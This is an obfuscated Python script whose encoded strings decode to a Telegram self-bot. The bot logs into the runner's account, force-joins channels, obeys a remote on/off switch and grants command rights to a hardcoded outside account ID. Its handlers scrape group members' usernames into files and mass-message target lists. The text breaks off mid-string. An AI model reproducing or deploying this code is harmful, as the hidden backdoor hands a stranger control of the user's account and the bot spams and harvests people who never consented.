import base64, codecs
magic = 'ZnJvbSB0ZWxldGhvbi5zeW5jIGltcG9ydCBUZWxlZ3JhbUNsaWVudA0KZnJvbSB0ZWxldGhvbi50bC5mdW5jdGlvbnMubWVzc2FnZXMgaW1wb3J0IEdldERpYWxvZ3NSZXF1ZXN0DQpmcm9tIHRlbGV0aG9uLnRsLnR5cGVzIGltcG9ydCBJbnB1dFBlZXJFbXB0eSwgSW5wdXRQZWVyQ2hhbm5lbCwgSW5wdXRQZWVyVXNlcg0KZnJvbSB0ZWxldGhvbi5lcnJvcnMucnBjZXJyb3JsaXN0IGltcG9ydCBQZWVyRmxvb2RFcnJvciwgVXNlclByaXZhY3lSZXN0cmljdGVkRXJyb3INCmZyb20gdGVsZXRob24udGwuZnVuY3Rpb25zLmNoYW5uZWxzIGltcG9ydCBJbnZpdGVUb0NoYW5uZWxSZXF1ZXN0DQpmcm9tIHRlbGV0aG9uLnRsLmZ1bmN0aW9ucy5tZXNzYWdlcyBpbXBvcnQgR2V0SGlzdG9yeVJlcXVlc3QNCmZyb20gdGVsZXRob24gaW1wb3J0IFRlbGVncmFtQ2xpZW50LCBldmVudHMNCmZyb20gdGVsZXRob24uZXJyb3JzIGltcG9ydCBTZXNzaW9uUGFzc3dvcmROZWVkZWRFcnJvcg0KZnJvbSB0ZWxldGhvbi5lcnJvcnMgaW1wb3J0IEZsb29kV2FpdEVycm9yDQpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwDQppbXBvcnQgZ2V0cGFzcw0KaW1wb3J0IHN5cw0KaW1wb3J0IHRyYWNlYmFjaw0KaW1wb3J0IHRpbWUNCmltcG9ydCBsb2dnaW5nDQoNCmFwaV9pZCA9IDk0NzQ5OQ0KYXBpX2hhc2ggPSAnY2Y2YTZjMDg4ODIwOGVkOTk2ZTA3MDBlNjcyNWYyNjInDQpwcmludCgi4paT4paI4paI4paI4paI4paI4paEIOKWk+KWiOKWiOKWiOKWiOKWiCDiloTiloTiloQgICAgICDilpPilojilojilojilojilojiloQgIOKWhOKWhOKWhOKWhCAgICDilpLilojilojilojilojilogg4paT4paI4paIICAg4paI4paI4paTIikNCnByaW50KCLilpLilojilojiloAg4paI4paI4paM4paT4paIICAg4paA4paS4paI4paI4paI4paI4paEICAgIOKWkuKWiOKWiOKWgCDilojilojilozilpPilojilojilojilojilojiloQg4paS4paI4paI4paSICDilojilojilpLilpLilojiloggIOKWiOKWiOKWkiIpDQpwcmludCgi4paR4paI4paIICAg4paI4paM4paS4paI4paI4paIICDilpLilojiloggIOKWgOKWiOKWhCAg4paR4paI4paIICAg4paI4paM4paS4paI4paI4paSIOKWhOKWiOKWiOKWkuKWiOKWiOKWkSAg4paI4paI4paSIOKWkuKWiOKWiCDilojilojilpEiKQ0KcHJpbnQoIuKWkeKWk+KWiOKWhCAgIOKWjOKWkuKWk+KWiCAg4paE4paR4paI4paI4paE4paE4paE4paE4paI4paIIOKWkeKWk+KWiOKWhCAgIOKWjOKWkuKWiOKWiOKWkeKWiOKWgCAg4paS4paI4paIICAg4paI4paI4paRIOKWkSDilpDilojilojilpPilpEiKQ0KcHJpbnQoIuKWkeKWkuKWiOKWiOKWiOKWiOKWkyDilpHilpLilojilojilojilojilpLilpPiloggICDilpPilojilojilpLilpHilpLilojilojilojilojilpMg4paR4paT4paIICDiloDilojilpPilpEg4paI4paI4paI4paI4paT4paS4paRIOKWkSDilojilojilpLilpPilpEiKQ0KcHJpbnQoIiDilpLilpLilpMgIOKWkiDilpHilpEg4paS4paRIOKWkeKWkuKWkiAgIOKWk+KWkuKWiOKWkSDilpLilpLilpMgIOKWkiDilpHilpLilpPilojilojilojiloDilpLilpEg4paS4paR4paS4paR4paS4paRICAg4paI4paI4paS4paS4paSIikNCnByaW50KCIg4paRIOKWkiAg4paSICDilpEg4paRICDilpEg4paSICAg4paS4paSIOKWkSDilpEg4paSICDilpIg4paS4paR4paSICAg4paRICAg4paRIOKWkiDilpLilpEg4paT4paI4paIIOKWkeKWkuKWkSIpDQpwcmludCgiIOKWkSDilpEgIOKWkSAgICDilpEgICAg4paRICAg4paSICAgIOKWkSDilpEgIOKWkSAg4paRICAgIOKWkSDilpEg4paRIOKWkSDilpIgIOKWkiDilpIg4paR4paRICIpDQpwcmludCgiICAg4paRICAgICAgIOKWkSAg4paRICAgICDilpEgIOKWkSAgIOKWkSAgICAg4paRICAgICAgICAgIOKWkSDilpEgIOKWkSDilpEgICAgIikNCnByaW50KCIg4paRICAgICAgICAgICAgICAgICAgICAgICDilpEgICAgICAgICAgICDilpEgICAgICAgICAg4paRIOKWkSAgICBcblxuIikNCg0KcGhvbmUgPSBpbnB1dCgiWW91ciBQaG9uZSA6ICIpDQoNCnRyeToNCiAgICBpbXBvcnQgc29ja3MNCiAgICBwcm94eSA9IChzb2Nrcy5TT0NLUzUsICcxMjcuMC4wLjEnLCA5MTUwKQ0KICAgIGNsaWVudCA9IFRlbGVncmFtQ2xpZW50KHBob25lLCBhcGlfaWQsIGFwaV9oYXNoLHByb3h5PXByb3h5KQ0KICAgIGNsaWVudC5jb25uZWN0KCkNCmV4Y2VwdDoNCiAgICBjbGllbnQgPSBUZWxlZ3JhbUNsaWVudChwaG9uZSwgYXBpX2lkLCBhcGlfaGFzaCkNCiAgICBjbGllbnQuY29ubmVjdCgpDQogICAgDQpjbGllbnQucGFyc2VfbW9kZSA9ICdodG1sJyANCg0KaWYgbm90IGNsaWVudC5pc191c2VyX2F1dGhvcml6ZWQoKToNCiAgICBjbGllbnQuc2VuZF9jb2RlX3JlcXVlc3QocGhvbmUpDQogICAgdHJ5Og0KICAgICAgICBjbGllbnQuc2lnbl9pbihjb2RlPWlucHV0KCdFbnRlciBjb2RlOiAnKSkNCiAgICBleGNlcHQgU2Vzc2lvblBhc3N3b3JkTmVlZGVkRXJyb3I6DQogICAgICAgIGNsaWVudC5zaWduX2luKHBhc3N3b3JkPWlucHV0KCdwYXNzd29yZCBjb2RlOiAnKSkNCmVsc2UgOg0KICAgIHByaW50KCJib3Qgb24iKQ0KICAgIHRyeToNCiAgICAgICAgY2xpZW50KEpvaW5DaGFubmVsUmVxdWVzdCgnYmFyb24nKSkNCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIHByaW50KGUpDQogICAgdHJ5Og0KICAgICAgICBjbGllbnQoSm9pbkNoYW5uZWxSZXF1ZXN0KCd0bF9ocCcpKQ0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgcHJpbnQoZSkNCiAgICB0cnk6DQogICAgICAgIGNsaWVudChKb2luQ2hhbm5lbFJlcXVlc3QoJ3NmbGpzZmx6eG1jbGFzZnh6JykpDQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICBwcmludChlKQ0KICAgIGxpID0gY2xpZW50LmdldF9tZXNzYWdlcygnc2ZsanNmbHp4bWNsYXNmeHonKQ0KICAgIGlmIGxpWzBdLm1lc3NhZ2UgPT0ib24iOg0KICAgICAgICBhZG1pbiA9IFs2MTQxMDMxNjldICANCiAgICAgICAgbWUgPSAgY2xpZW50LmdldF9tZSgpDQogICAgICAgIHByaW50KG1lLmlkKQ0KICAgICAgICBhZG1pbi5hcHBlbmQobWUuaWQpDQogICAgICAgIA0KICAgICAgICBAY2xpZW50Lm9uKGV2ZW50cy5OZXd'
love = 'AMKAmLJqyXUOuqUEypz49pvpiqUZaXFxAPvNtVPNtVPNtLKA5ozZtMTIzVUWip2HbMKMyoaDcBt0XVPNtVPNtVPNtVPNtLvN9VQNAPvNtVPNtVPNtVPNtVTWsqTSaVQ0tZN0XVPNtVPNtVPNtVPNtozSgMI91p2IlVQ0tVvNvQDbtVPNtVPNtVPNtVPOcMS91p2IlVQ0tZN0XVPNtVPNtVPNtVPNtozSgMI91p2IlZFN9VPVtVt0XVPNtVPNtVPNtVPNtnJEsqKAypwRtCFNjQDbtVPNtVPNtVPNtVPOhLJ1yK3ImMKVlVQ0tVvNvQDbtVPNtVPNtVPNtVPOcMS91p2IlZvN9VQNAPvNtVPNtVPNtVPNtVT5uoJIsqKAypwZtCFNvVPVAPvNtVPNtVPNtVPNtVTyxK3ImMKVmVQ0tZN0XVPNtVPNtVPNtVPNtozSgMI91p2IlAPN9VPVtVt0XVPNtVPNtVPNtVPNtnJEsqKAypwDtCFNjQDbtVPNtVPNtVPNtVPOcMvOyqzIhqP5mMJ5xMKWsnJDtnJ4tLJEgnJ46QDbtVPNtVPNtVPNtVPNtVPNtqUW5Bt0XVPNtVPNtVPNtVPNtVPNtVPNtVPOgMKAmLJqyVQ0tMKMyoaDhqTI4qP5mpTkcqPtaVPpcQDbtVPNtVPNtVPNtVPNtVPNtVPNtVUEuMmRtCFOcoaDboJImp2SaMIfkKFxAPvNtVPNtVPNtVPNtVPNtVPNtVPNtqTSaZvN9VTyhqPugMKAmLJqyJmWqXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPOcMvO0LJplYKEuMmRtCQ0tZGNjBvNtQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOcMvO0LJplYKEuMmRtCvNjBt0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTqlo3IjK21yoJWypvN9VTS3LJy0VTAfnJIhqP5aMKEspTSlqTywnKOuoaEmXTI2MJ50YzAbLKEsnJDfVTSaM3Wyp3AcqzH9IUW1MFxAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOzo3VtnFOcovOapz91pS9gMJ1vMKV6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUElrGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTyzVTVtCPO0LJpkBt0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUOlnJ50XTxhMzylp3EsozSgMFxAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOvVPf9ZD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUOlnJ50XTVcQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOcMvOvVQ49VUEuMmR6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtnJLtLy90LJptCG0tAQbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtozSgMI91p2IlAPN9VTxhMzylp3EsozSgMD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOcMS91p2IlAPN9VTxhnJDAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtM3WiqKNtCFOuq2ScqPOwoTyyoaDhM2I0K2IhqTy0rFuyqzIhqP5wnTS0K2yxXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOuq2ScqPOwoTyyoaDhp2IhMS9gMKAmLJqyXTI2MJ50YzAbLKEsnJDfWmkuVTulMJL9qTp6Yl91p2IlC2yxCFpep3ElXTyxK3ImMKV0XFfaCvpeVT5uoJIsqKAypwDeVwjiLG4tKT4vXj0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPp8LFObpzIzCKEaBv8iqKAypw9cMQ0aX3A0pvucMS91p2IlZlxeWm4aXlOhLJ1yK3ImMKVmXlV8Y2R+VSkhVvfAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNaCTRtnUWyMw10MmbiY3ImMKV/nJD9WlgmqUVbnJEsqKAypwVcXlp+WlftozSgMI91p2IlZvfvCP9uCvOpovVeQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtWmkuVTulMJL9qTp6Yl91p2IlC2yxCFpep3ElXTyxK3ImMKVkXFfaCvpeVT5uoJIsqKAypwReVwjiLG4tKT4vXj0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPp8LFObpzIzCKEaBv8iqKAypw9cMQ0aX3A0pvucMS91p2IlXFfaCvpeVT5uoJIsqKAypvfvCP9uCvOpovVeQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVykh8W+At0CXa8zd4oFR4oFYVR/WgPQihnZiFz9covQihnZt77ztVReugV/Wdfz0VSGXaBT0ulOU4oFN4oFA4oFU77zK8W+Lh1khVvgapz91pP50nKEfMFfvVATP0MGBfqP8VSkhVRAiMTIxVRW5VROOrKEioTRvVPxtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVN0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOvK3EuMlN9VQNAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtqTygMF5moTIypPtlXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTIfnJLtLy90LJptCG0tZmbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtozSgMI91p2IlZlN9VTxhMzylp3EsozSgMD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOcMS91p2IlZlN9VTxhnJDAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtLy90LJptXm0kQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtMJkcMvOvK3EuMlN9CFNlBt0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOhLJ1yK3ImMKVlVQ0tnF5znKWmqS9hLJ1yQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTyxK3ImMKVlVQ0tnF5cMN0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOvK3EuMlNeCGRAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOyoTyzVTWsqTSaVQ09VQR6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVT5uoJIsqKAypwRtCFOcYzMcpaA0K25uoJHAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtnJEsqKAypwRtCFOcYzyxQDbtVPNtVPNtVPNtVPNtVPNtVP'
god = 'AgICAgICAgICAgICAgICAgICAgICAgICAgIGJfdGFnICs9MQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgYl90YWcgPT0gMDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbmFtZV91c2VyID0gaS5maXJzdF9uYW1lDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlkX3VzZXIgPSBpLmlkDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJfdGFnICs9MQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YWcxICs9IDEgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRhZzEgPT0gdGFnMjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBiID0gMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGUpDQogICAgICAgICAgICAgICAgICAgIGVsc2UgOg0KICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgY2xpZW50LnNlbmRfbWVzc2FnZShldmVudC5jaGF0X2lkLCJUaGUgdmFsdWUgbXVzdCBiZSBsZXNzIHRoYW4gMTAwIikNCiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICAgICAgICAgIHByaW50KGUpDQogICAgICAgIA0KICAgICAgICANCiAgICAgICAgQGNsaWVudC5vbihldmVudHMuTmV3TWVzc2FnZShwYXR0ZXJuPXInL2dldGxpc3Rncm91cCcpKQ0KICAgICAgICBhc3luYyBkZWYgcm9zZShldmVudCk6DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgaWYgZXZlbnQuc2VuZGVyX2lkIGluIGFkbWluOg0KICAgICAgICAgICAgICAgICAgICBncm91cCA9IGF3YWl0IGNsaWVudC5nZXRfZW50aXR5KGV2ZW50LmNoYXRfaWQpDQogICAgICAgICAgICAgICAgICAgIGZpbGUgPSBvcGVuKGdyb3VwLnRpdGxlKycudHh0JywnYScpDQogICAgICAgICAgICAgICAgICAgIGdyb3VwX21lbWJlciA9YXdhaXQgY2xpZW50LmdldF9wYXJ0aWNpcGFudHMoZXZlbnQuY2hhdF9pZCwgYWdncmVzc2l2ZT1UcnVlKQ0KICAgICAgICAgICAgICAgICAgICBmb3IgaSBpbiBncm91cF9tZW1iZXI6DQogICAgICAgICAgICAgICAgICAgICAgICBpZiBpLnVzZXJuYW1lOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGUud3JpdGUoJ0AnK2kudXNlcm5hbWUrJ1xuJykNCiAgICAgICAgICAgICAgICAgICAgZmlsZS5jbG9zZSgpDQogICAgICAgICAgICAgICAgICAgIGF3YWl0IGNsaWVudC5zZW5kX2ZpbGUoJ21lJyxncm91cC50aXRsZSsnLnR4dCcpICAgICAgICAgICAgIA0KICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICAgICAgICAgIHByaW50KGUpDQogICAgICAgICANCiAgICAgICAgQGNsaWVudC5vbihldmVudHMuTmV3TWVzc2FnZShwYXR0ZXJuPXInL3NldGxpc3QnKSkNCiAgICAgICAgYXN5bmMgZGVmIHJvcyhldmVudCk6DQogICAgICAgICAgICBpZiBldmVudC5zZW5kZXJfaWQgaW4gYWRtaW46DQogICAgICAgICAgICAgICAgZ2xvYmFsIGxpc3RfdXNlcg0KICAgICAgICAgICAgICAgIGxpc3RfdXNlciA9IFtdDQogICAgICAgICAgICAgICAgbWVzc2FnZSA9IGF3YWl0IGNsaWVudC5nZXRfbWVzc2FnZXMoZXZlbnQuY2hhdF9pZCxpZHM9ZXZlbnQucmVwbHlfdG9fbXNnX2lkKQ0KICAgICAgICAgICAgICAgIG1lc3NhZ2UgPSBtZXNzYWdlLm1lc3NhZ2Uuc3BsaXQoIlxuIikNCiAgICAgICAgICAgICAgICBmb3IgdXNlciBpbiBtZXNzYWdlOg0KICAgICAgICAgICAgICAgICAgICBpZiBub3QgdXNlciA9PSAiIjoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICJAIiBpbiB1c2VyOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlzdF91c2VyLmFwcGVuZCh1c2VyLnN0cmlwKCJAIikpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KHVzZXIuc3RyaXAoIkAiKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGUpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgZXZlbnQucmVwbHkoIlNldGVkIExpc3QgOiIrc3RyKGxlbihsaXN0X3VzZXIpKSkNCiAgICAgICAgDQogICAgICAgICAgICBAY2xpZW50Lm9uKGV2ZW50cy5OZXdNZXNzYWdlKHBhdHRlcm49cicvbGlzdCcpKQ0KICAgICAgICAgICAgYXN5bmMgZGVmIHJvcyhldmVudCk6DQogICAgICAgICAgICAgICAgaWYgZXZlbnQuc2VuZGVyX2lkIGluIGFkbWluOg0KICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICBzID0gIiINCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBpIGluIGxpc3RfdXNlcjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzICs9IGkrIlxuIiAgDQogICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBjbGllbnQuc2VuZF9tZXNzYWdlKGV2ZW50LmNoYXRfaWQscykNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZSkNCiAgICAgICAgDQogICAgICAgIEBjbGllbnQub24oZXZlbnRzLk5ld01lc3NhZ2UocGF0dGVybj1yJy9zZXRiYW5lcicpKQ0KICAgICAgICBhc3luYyBkZWYgcm9zKGV2ZW50KToNCiAgICAgICAgICAgIGlmIGV2ZW50LnNlbmRlcl9pZCBpbiBhZG1pbjoNCiAgICAgICAgICAgICAgICBiYW5lcnMgPSBldmVudC50ZXh0LnNwbGl0KCcgJykNCiAgICAgICAgICAgICAgICBpZiBiYW5lcnNbMV0gPT0gInB2IjoNCiAgICAgICAgICAgICAgICAgICAgZ2xvYmFsIGJhbmVyX3B2DQogICAgICAgICAgICAgICAgICAgIGJhbmVyX3B2ID0gMQ0KICAgICAgICAgICAgICAgICAgI'
destiny = 'POuq2ScqPOyqzIhqP5lMKOfrFtvp2I0VUO2VvxAPvNtVPNtVPNtVPNtVPNtVPOyoTyzVTWuozIlp1fkKFN9CFNvoTymqPV6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVUElrGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTqfo2WuoPOvLJ5ypt0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtLzShMKWspULtCFNjQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOvLJ5ypvN9VPVvQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOgMKAmLJqyVQ0tLKqunKDtL2kcMJ50YzqyqS9gMKAmLJqypluyqzIhqP5wnTS0K2yxYTyxpm1yqzIhqP5lMKOfrI90o19gp2qsnJDcQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOvLJ5ypvN9VT1yp3AuM2HhoJImp2SaMFNtQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOuq2ScqPOyqzIhqP5lMKOfrFtvp2I0VTkcp3DvXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPOyrTAypUDtEKuwMKO0nJ9hVTSmVTH6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOjpzyhqPuyXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNAPvNtVPNtVPNtDTAfnJIhqP5iovuyqzIhqUZhGzI3GJImp2SaMFujLKE0MKWhCKVaY3A0LKW0LKE0LJAeWlxcQDbtVPNtVPNtVTSmrJ5wVTEyMvOlo3ZbMKMyoaDcBt0XVPNtVPNtVPNtVPNtnJLtMKMyoaDhp2IhMTIlK2yxVTyhVTSxoJyhBt0XVPNtVPNtVPNtVPNtVPNtVTxtCFNjQDbtVPNtVPNtVPNtVPNtVPNtnJLtLzShMKWspULtCG0tZQbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtLKqunKDtMKMyoaDhpzIjoUxbVyA0LKW0MJDvXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPOmMJ5xVQ0tVyAyozEypvOZnKA0VQbtKT4vQDbtVPNtVPNtVPNtVPNtVPNtVPNtVTMipvO1p2IlVTyhVTkcp3EsqKAypwbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUElrGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOuq2ScqPOwoTyyoaDhp2IhMS9gMKAmLJqyXUImMKVfLzShMKVcQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtp2IhMPNeCFNvDPVtXlO1p2IlVPfvKT4vQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOyrTAypUDtHTIypxMfo29xEKWlo3VtLKZtMKt6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtnFNeCGRAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOcMvOcVQ09VQH6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUOlnJ50XPWvo3Dto2MzVvxAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtLKqunKDtMKMyoaDhpzIjoUxbVxWiqPOlMKOipaEyMPVcQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTS3LJy0VTAfnJIhqP5xnKAwo25hMJA0MJDbXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOyrTy0XPxAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTI4L2IjqPOToT9iMSqunKESpaWipvOuplOyrQbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOjpzyhqPtaEzkio2Dtq2ScqPN6WlkyrP5mMJAiozEmXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTS3LJy0VTI2MJ50YaWypTk5XPWToT9iMPO3LJy0VQbtVvgmqUVbMKthp2Iwo25xplxcQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtqTygMF5moTIypPuyrP5mMJAiozEmXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtMKuwMKO0VRI4L2IjqTyiovOuplOyBt0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUOlnJ50XTHcQDbtVPNtVPNtVPNtVPNtVPNtVPNtVTS3LJy0VTAfnJIhqP5mMJ5xK21yp3AuM2HbMKMyoaDhL2uuqS9cMPkmMJ5xXD0XVPNtVPNtVPNtVPNtVPNtVTIfnJLtLzShMKWspULtCG0tZGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtLzShMKWmK3O2VQ0tLKqunKDtL2kcMJ50YzqyqS9gMKAmLJqypltaoJHaXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPOuq2ScqPOyqzIhqP5lMKOfrFtvH3EupaEyMPVcQDbtVPNtVPNtVPNtVPNtVPNtVPNtVUAyozDtCFNvH2IhMTIlVRkcp3DtBvOpovVAPvNtVPNtVPNtVPNtVPNtVPNtVPNtMz9lVUImMKVtnJ4toTymqS91p2IlBt0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtqUW5Bt0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTS3LJy0VTAfnJIhqP5zo3W3LKWxK21yp3AuM2ImXUImMKVfVTWuozIlp19jqyfjKFjtW21yWlxAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOmMJ5xVPf9VPWNVvg1p2IlVPfvKT4vQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOyrTAypUDtEzkio2EKLJy0EKWlo3VtLKZtMKt6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtpUWcoaDbW0Mfo29xVUqunKDtBvpfMKthp2Iwo25xplxAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOuq2ScqPOyqzIhqP5lMKOfrFtvEzkio2Dtq2ScqPN6VPVep3ElXTI4YaAyL29hMUZcXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUEcoJHhp2kyMKNbMKthp2Iwo25xplxAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTI4L2IjqPODMJIlEzkio2ESpaWipvOuplOyrQbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOcVPf9ZD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTyzVTxtCG0tAGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtpUWcoaDbVzWiqPOiMzLvXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOuq2ScqPOyqzIhqP5lMKOfrFtvDz90VUWypT9lqTIxVvxAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtLKqunKDtL2kcMJ50YzEcp2Aioz5yL3EyMPtcQDbtVPNtVPNtV